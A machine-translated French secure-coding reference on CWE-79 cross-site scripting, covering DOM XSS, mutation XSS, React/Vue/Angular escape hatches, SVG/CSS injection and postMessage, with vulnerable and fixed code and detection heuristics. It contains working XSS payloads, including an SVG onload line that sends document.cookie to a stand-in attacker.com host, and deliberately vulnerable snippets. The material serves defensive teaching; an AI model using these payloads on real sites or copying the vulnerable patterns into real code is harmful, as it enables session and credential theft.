---
description: "CWE-79 : donnée contrôlée par l'attaquant insérée dans le DOM/HTML sans échappement. Entrée approfondie : XSS DOM, mXSS, mécanismes de contournement des frameworks, injection SVG/CSS, postMessage."
date: 2026-04-16
tags: [security, cwe, xss, dom-xss, mxss, javascript, react, vue, angular, frontend]
level: Advanced
source_sha256: f4dd9d13f0a734b151065503390ef7347a75ac5547fb788a963458148cde79f0
translation: machine
translated_at: '2026-10-24'
---
# CWE-79 : Cross-Site Scripting (XSS) {#cwe-79-cross-site-scripting-xss}

**CWE-79** | OWASP Top 10 A03:2021 | Rang 1 du CWE Top 25 (entrée approfondie Vul-RAG)

## Sémantique fonctionnelle {#functional-semantics}

Le XSS injecte un script contrôlé par l'attaquant dans le contexte d'exécution du navigateur de la victime, ce qui lui confère les pleins privilèges de la même origine : vol de cookies, détournement de session, enregistrement des frappes au clavier, manipulation du DOM, collecte d'identifiants, et utilisation du navigateur comme point de pivot. Trois sous-types diffèrent par leur persistance et leur chemin d'exécution, mais pas par leur impact :

- **Reflected** : la charge utile est renvoyée dans la réponse immédiate ; la victime doit visiter une URL de l'attaquant
- **Stored** : la charge utile est persistée (base de données, journal, champ de profil) et affichée à d'autres utilisateurs
- **DOM-based** : aucune implication du serveur ; le JavaScript côté client lit les données de l'attaquant depuis l'URL ou un `postMessage` et les écrit dans le DOM

Cette entrée se concentre sur les vecteurs non triviaux : XSS DOM, mutation XSS, mécanismes de contournement des frameworks, injection SVG/CSS et attaques par `postMessage`.

## Cause racine {#root-cause}

L'analyseur HTML du navigateur ne distingue pas le balisage provenant de l'application de celui provenant des données utilisateur. Toute chaîne contrôlée par l'utilisateur insérée dans un contexte HTML sans échappement tenant compte du contexte devient exécutable.

Trois modes de défaillance :
1. **Absence d'échappement** : chaîne brute interpolée dans le HTML
2. **Échappement incorrect** : chaîne échappée en HTML placée dans un contexte JavaScript (JS exige un échappement de chaîne JS, et non `&amp;`)
3. **Contournement de l'échappement** : l'entrée utilisateur subit une transformation qui réintroduit une syntaxe exécutable (mutation XSS)

## XSS DOM {#dom-based-xss}

Aucune réflexion côté serveur n'est nécessaire. La source est une API du navigateur ; le sink est une fonction de manipulation du DOM.

**Sources** (données du DOM contrôlées par l'attaquant) :
- `location.hash`, `location.search`, `location.href`
- `document.referrer`
- `window.name`
- données de `postMessage`
- `localStorage`/`sessionStorage` si préalablement empoisonnés
- `document.cookie` (si l'application écrit le cookie à partir d'un paramètre d'URL)

**Sinks** (exécution de code lors de l'affectation) :
- `element.innerHTML = ...`
- `element.outerHTML = ...`
- `document.write(...)`
- `document.writeln(...)`
- `eval(...)`, `new Function(...)`
- `setTimeout("string")`, `setInterval("string")`
- `element.insertAdjacentHTML(...)`
- `DOMParser.parseFromString(..., "text/html")` suivi d'une insertion
- jQuery : `$(selector).html(...)`, `$.parseHTML()`

```javascript
// VULNERABLE: source = location.hash, sink = innerHTML
// Attack URL: https://example.com/page#<img src=x onerror=alert(1)>
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").innerHTML = "Hello " + param;

// VULNERABLE: source = postMessage, sink = innerHTML (no origin check)
window.addEventListener("message", (e) => {
    document.getElementById("content").innerHTML = e.data.html;
});

// VULNERABLE: source = URL param, sink = eval
const fn = new URLSearchParams(location.search).get("callback");
eval(fn + "()"); // attacker: ?callback=alert(document.cookie)
```

```javascript
// FIXED: DOM XSS — use textContent (no HTML parsing) for text; DOMPurify for HTML
const param = decodeURIComponent(location.hash.slice(1));
document.getElementById("welcome").textContent = "Hello " + param; // safe

// FIXED: postMessage with origin validation and sanitization
window.addEventListener("message", (e) => {
    if (e.origin !== "https://trusted-partner.com") return;
    const clean = DOMPurify.sanitize(e.data.html); // allowlist-based sanitization
    document.getElementById("content").innerHTML = clean;
});
```

## Mutation XSS (mXSS) {#mutation-xss-mxss}

Le mXSS survient lorsqu'une chaîne assainie est réanalysée par l'analyseur HTML du navigateur et que la mutation produit du balisage exécutable. L'assainisseur voit du HTML sûr ; après insertion et réanalyse, le navigateur reconstruit un DOM différent et exécutable.

**Vecteur mXSS classique : confusion d'espaces de noms**

```html
<!-- Input after DOMPurify (old versions): appears safe -->
<svg><p id="<img src=x onerror=alert(1)>"></p></svg>

<!-- Browser re-parses and extracts img from SVG namespace context:
     The parser's state machine treats the SVG content differently,
     causing the id attribute content to become an img element -->
```

**mXSS via noscript :**
```html
<!-- When JS is enabled, <noscript> content is not parsed as HTML.
     Sanitizer parses without JS → sees text node inside noscript → passes.
     Browser with JS enabled → parses noscript differently in some contexts. -->
<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>
```

**Atténuation :** maintenez les bibliothèques d'assainissement à jour (DOMPurify 3.x a corrigé de nombreux vecteurs de mXSS). Appliquez l'assainissement au moment de l'insertion (`innerHTML = DOMPurify.sanitize(html)`), et non au moment du stockage : l'assainissement au stockage devient caduc à chaque mise à jour de la bibliothèque.

## Mécanismes de contournement des frameworks {#framework-escape-hatches}

Les frameworks fournissent des valeurs par défaut sûres, mais exposent des contournements explicites pour les insertions HTML jugées « légitimes ».

### React : dangerouslySetInnerHTML {#react-dangerouslysetinnerhtml}

```jsx
// VULNERABLE: user-controlled description rendered as HTML
function PostBody({ post }) {
    return (
        <div dangerouslySetInnerHTML={{ __html: post.description }} />
    );
}

// FIXED: sanitize before insertion
import DOMPurify from "dompurify";

function PostBody({ post }) {
    const clean = DOMPurify.sanitize(post.description, {
        ALLOWED_TAGS: ["p", "b", "i", "a", "ul", "li"],
        ALLOWED_ATTR: ["href", "target"]
    });
    return <div dangerouslySetInnerHTML={{ __html: clean }} />;
}
```

**Remarque spécifique à React :** l'interpolation `{}` en JSX échappe toujours la valeur : `<div>{userInput}</div>` est sûr. Seuls `dangerouslySetInnerHTML` et les `href` en `javascript:` constituent des sinks.

```jsx
// VULNERABLE: javascript: href
function Link({ url }) {
    return <a href={url}>Click</a>; // attacker: url = "javascript:alert(1)"
}

// FIXED: validate URL scheme
function Link({ url }) {
    const safe = /^https?:\/\//.test(url) ? url : "#";
    return <a href={safe}>Click</a>;
}
```

### Vue : v-html {#vue-v-html}

```vue
<!-- VULNERABLE: v-html renders raw HTML -->
<template>
    <div v-html="userComment"></div>
</template>

<!-- FIXED: sanitize in computed property -->
<template>
    <div v-html="sanitizedComment"></div>
</template>

<script>
import DOMPurify from "dompurify";
export default {
    computed: {
        sanitizedComment() {
            return DOMPurify.sanitize(this.userComment);
        }
    }
}
</script>
```

### Angular : bypassSecurityTrust* {#angular-bypasssecuritytrust}

```typescript
// VULNERABLE: bypasses Angular's sanitization
import { DomSanitizer } from "@angular/platform-browser";

@Component({
    template: `<div [innerHTML]="trustedHtml"></div>`
})
export class ContentComponent {
    trustedHtml: SafeHtml;

    constructor(private sanitizer: DomSanitizer) {
        // bypassSecurityTrustHtml tells Angular not to sanitize
        this.trustedHtml = this.sanitizer.bypassSecurityTrustHtml(
            this.userInput // VULNERABLE if userInput is attacker-controlled
        );
    }
}

// FIXED: use Angular's built-in sanitization (default [innerHTML] behavior)
@Component({
    template: `<div [innerHTML]="userInput"></div>` // Angular sanitizes automatically
})
export class ContentComponent {
    userInput: string; // Angular's DomSanitizer strips script tags by default
}
```

## Injection SVG et MathML {#svg-and-mathml-injection}

Le SVG est un HTML5 valide et exécute du script dans la même origine lorsqu'il est intégré :

```html
<!-- Stored as profile avatar URL or in rich text -->
<svg xmlns="http://www.w3.org/2000/svg">
    <script>alert(document.cookie)</script>
</svg>

<!-- SVG event handlers — no <script> tag needed -->
<svg onload="fetch('https://attacker.com/?c='+document.cookie)">
    <animate attributeName="x" values="0;1" onbegin="eval(atob('YWxlcnQoMSk='))"/>
</svg>

<!-- MathML -->
<math><mtext><![CDATA[</mtext><script>alert(1)</script>]]></mtext></math>
```

**Détection :** gestionnaires de téléversement de fichiers qui acceptent le SVG sans supprimer `<script>` ni les gestionnaires d'événements. Reniflage de type MIME par les navigateurs si le serveur sert le SVG en `text/plain` ou `application/octet-stream` sans `X-Content-Type-Options: nosniff`.

**Correctif :** soit rejeter les téléversements SVG, soit les assainir avec un analyseur qui supprime le contenu des scripts (DOMPurify gère le SVG ; côté serveur : `svgo` avec le plugin `removeScripts`).

## Injection CSS {#css-injection}

L'injection CSS est de moindre gravité que l'injection de script, mais reste exploitable :

```html
<!-- Style injection via unescaped CSS value -->
<style>
    .user-theme { color: {{ userColor }}; }
</style>
<!-- attacker input: red; } body { background: url('//attacker.com/?c='+document.cookie+'; .x { -->
```

**Impact de l'injection CSS :**
- exfiltration de données via `background: url()` ou `font-face src` (exfiltration CSS)
- redressement d'interface / superposition de clickjacking
- `expression()` (ancien IE) exécutant du JS
- `@import` CSS d'une feuille de style externe

**Correctif :** n'interpolez jamais de données utilisateur dans des blocs `<style>` ou des attributs `style=`. Utilisez des propriétés personnalisées CSS avec des valeurs validées.

## PostMessage sans vérification de l'origine {#postmessage-without-origin-check}

```javascript
// VULNERABLE: any window can send messages
window.addEventListener("message", (event) => {
    // Missing: if (event.origin !== "https://trusted.com") return;
    document.getElementById("panel").innerHTML = event.data;
});

// FIXED: strict origin allowlist
const ALLOWED_ORIGINS = new Set(["https://app.example.com", "https://widget.example.com"]);

window.addEventListener("message", (event) => {
    if (!ALLOWED_ORIGINS.has(event.origin)) return;
    // Also validate structure — event.data could be any type
    if (typeof event.data !== "object" || !event.data.type) return;
    handleMessage(event.data);
});
```

## Exigences d'échappement selon le contexte {#context-specific-escaping-requirements}

| Contexte d'insertion | Échappement requis | Approche incorrecte |
|---|---|---|
| Contenu du corps HTML | Encodage en entités HTML (`&lt;`, `&gt;`, `&amp;`, `&quot;`) | Aucun |
| Valeur d'attribut HTML | Encodage en entités HTML + guillemets sur l'attribut | Encodage HTML seul (attributs sans guillemets) |
| Chaîne JavaScript | Échappement de chaîne JS (`\`, `"`, `'`, `\n`, `\r`) | Encodage en entités HTML |
| Template literal JavaScript | Échappement JS + échappement des backticks et de `${` | Encodage en entités HTML |
| Valeur CSS | Encodage hexadécimal CSS | Encodage en entités HTML |
| Paramètre d'URL | `encodeURIComponent()` | Encodage en entités HTML |
| JSON dans `<script>` | `</` → `<\/`, `<!--` → `<\!--` | JSON standard seul |

## Heuristiques de détection {#detection-heuristics}

**Déclencheurs d'analyse statique :**
- `innerHTML`, `outerHTML`, `insertAdjacentHTML` avec un membre droit non constant
- `document.write(`, `document.writeln(` avec des arguments variables
- `eval(`, `new Function(`, `setTimeout(string`, `setInterval(string`
- `dangerouslySetInnerHTML={{ __html: expr }}` où `expr` n'est pas un littéral
- `v-html="expr"` où `expr` n'est pas assaini dans une propriété calculée
- `bypassSecurityTrustHtml(`, `bypassSecurityTrustScript(`, `bypassSecurityTrustUrl(`
- `window.addEventListener("message", ...)` sans vérification de l'origine
- jQuery : `.html(expr)`, `.append(expr)` où `expr` dérive de données utilisateur

**Déclencheurs de flux de données :**
- `location.hash`, `location.search`, `document.referrer` atteignant des sinks DOM sans échappement
- `event.data` de `postMessage` atteignant `innerHTML`
- chaîne issue de la base de données, renvoyée par une API, puis injectée côté client dans `innerHTML`

**Indicateurs de faux positifs :**
- `innerHTML` affecté à une chaîne littérale dans le code source (aucun flux de données contrôlé par l'utilisateur)
- `dangerouslySetInnerHTML` consommant la sortie de `DOMPurify.sanitize` avec une liste d'autorisation stricte
- moteur de rendu Markdown produisant du HTML préalablement assaini avec une liste d'autorisation maintenue (par exemple `marked` + `sanitize-html`)
- `eval()` appliqué à une réponse JSON provenant de l'API propre à l'application, via HTTPS : risque plus faible, mais à signaler quand même (utilisez `JSON.parse`)

## Pièges {#gotchas}

- **Assainissement au stockage ou au rendu :** assainir à la saisie puis stocker le HTML nettoyé fige la version de l'assainisseur. Un contournement découvert ultérieurement affecte tout le contenu historique. Assainissez au moment du rendu, avec la version courante de la bibliothèque.
- **Trusted Types (API du navigateur) :** l'API Trusted Types de Chrome impose que seules des « politiques » désignées puissent affecter `innerHTML`. C'est une défense en profondeur efficace ; configurez-la via `Content-Security-Policy: require-trusted-types-for 'script'`. Elle ne remplace pas l'assainissement des entrées.
- **La CSP n'est pas un correctif principal :** `Content-Security-Policy: script-src 'self'` bloque de nombreuses attaques XSS, mais peut être contournée par des points de terminaison JSONP sur des origines autorisées, par `$compile` d'Angular, ou par des bibliothèques hébergées sur un CDN. Utilisez la CSP comme défense en profondeur, et non comme contrôle principal.
- **URI `javascript:` dans href/src/action :** l'encodage HTML d'une URL n'empêche pas `javascript:alert(1)` d'être un `href` exécutable. Validez le schéma séparément (`/^https?:/`).
- **DOM clobbering :** les éléments HTML dotés d'attributs `id` ou `name` masquent les variables JavaScript globales. `<img id="document">` peut masquer `document.forms`, ouvrant la voie à une pollution de prototype. Assainissez les attributs id/name dans le HTML non fiable.
- **Injection de template côté serveur ou XSS côté client :** `{{ user_input }}` dans Jinja2 avec l'échappement automatique est sûr pour le HTML, mais devient vulnérable si `user_input` atteint un `{{ user_input | safe }}` non échappé. Il s'agit de SSTI (CWE-1336), et non de XSS, mais l'impact peut aller jusqu'à l'exécution de code à distance (RCE).

## Voir aussi {#see-also}

- CWE-116 : Improper Encoding : cause racine : encodage de sortie incorrect ou absent
- CWE-352 : Csrf : combinaison fréquente : le XSS contourne les jetons CSRF stockés dans des emplacements accessibles au JavaScript
- CWE-1336 : Template Injection : équivalent côté serveur ; flux de données similaire, impact plus élevé (RCE)
- CWE-601 : Open Redirect : souvent enchaîné : redirection vers une page de livraison de la charge utile XSS de l'attaquant
